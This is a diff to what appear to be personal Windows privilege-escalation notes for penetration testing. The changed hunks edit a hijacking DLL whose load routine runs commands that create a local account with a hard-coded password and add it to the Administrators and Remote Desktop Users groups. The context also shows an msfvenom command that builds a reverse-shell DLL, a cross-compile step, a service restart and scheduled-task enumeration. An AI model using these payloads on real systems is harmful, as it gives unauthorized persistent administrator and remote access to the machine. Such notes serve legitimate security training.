@@ -170,8 +170,9 @@ LPVOID lpReserved ) // Reserved
     {
         case DLL_PROCESS_ATTACH: // A process is loading the DLL.
         int i;
-  	    i = system ("net user dave3 password123! /add");
-  	    i = system ("net localgroup administrators dave3 /add");
+  	    i = system ("net user kali password123! /add");
+  	    i = system ("net localgroup administrators kali /add");
+  	    i = system ("net localgroup \"Remote Desktop Users\" kali /add");
         break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
         break;
@@ -221,6 +222,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=x -f dll -o En
 Cross-Compile the C++ code
 ```
 x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+```
+
+restart service
+```
+restart-service SERVICE
 ```
 
 ## Unquated Service Path
@@ -275,7 +281,7 @@ schtasks /query /fo LIST /v
 
 filtering 
 ```
-chtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
+schtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
 ```
 
 or
